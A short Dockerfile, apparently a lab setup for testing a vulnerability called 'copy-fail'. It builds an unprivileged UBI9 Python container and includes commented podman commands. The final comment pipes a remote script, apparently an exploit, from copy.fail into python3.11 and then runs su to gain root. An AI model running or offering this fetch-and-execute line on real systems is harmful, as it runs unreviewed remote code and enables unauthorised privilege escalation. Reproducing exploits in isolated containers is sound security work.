ARG IMAGE_NAME=registry.access.redhat.com/ubi9/ubi
FROM ${IMAGE_NAME}

# hadolint ignore=DL3002
USER 0

RUN dnf install -y python3.11

USER 1001

WORKDIR /tmp

EXPOSE 8000
CMD ["python3", "-m", "http.server", "8000"]

# podman build -t copy-fail .
# podman run -d --rm --name copy-fail --replace copy-fail
# podman exec -it copy-fail /bin/bash

# curl https://copy.fail/exp | python3.11 && su
